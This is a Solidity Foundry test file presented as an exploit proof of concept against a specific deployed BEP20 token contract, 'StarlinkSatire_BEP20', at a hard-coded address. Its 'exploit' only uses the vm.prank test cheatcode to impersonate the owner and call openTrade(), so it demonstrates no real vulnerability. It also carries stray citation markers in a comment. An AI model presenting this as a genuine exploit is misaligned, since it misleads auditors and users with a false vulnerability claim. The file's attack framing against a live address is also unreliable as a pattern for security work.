pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @dev Interface for the target contract.
 * It defines the function signatures needed for interaction.
 */
interface StarlinkSatire_BEP20 {
    function owner() external view returns (address);
    function openTrade() external;
    function tradeEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x21032D09Cb4F8949883bdEf62D3F1eb5288259BC;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No setup code is required as the TARGET address is pre-configured.
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address contractOwner = StarlinkSatire_BEP20(TARGET).owner();
        vm.prank(contractOwner);
        StarlinkSatire_BEP20(TARGET).openTrade();

        // Correction: Access the `tradeEnabled` state variable via its public getter function.
        // For public state variables, Solidity automatically creates a getter function. [6, 11]
        assertEq(StarlinkSatire_BEP20(TARGET).tradeEnabled(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

